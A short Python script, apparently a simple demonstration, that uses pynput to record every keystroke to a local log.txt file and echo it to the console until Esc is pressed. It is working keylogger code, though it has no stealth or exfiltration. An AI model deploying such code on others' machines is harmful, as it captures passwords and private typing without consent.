import pynput
from pynput.keyboard import *

log_file = open('log.txt','a')

def pressed(key):
    print(key, end='')
    log_file.write(str(key)) 

# Once the esc key is pressed and released, the program will stop
def released(key):
    if key == Key.esc:
        return False

with Listener(on_press=pressed, on_release=released) as l:
    l.join()

log_file.close()

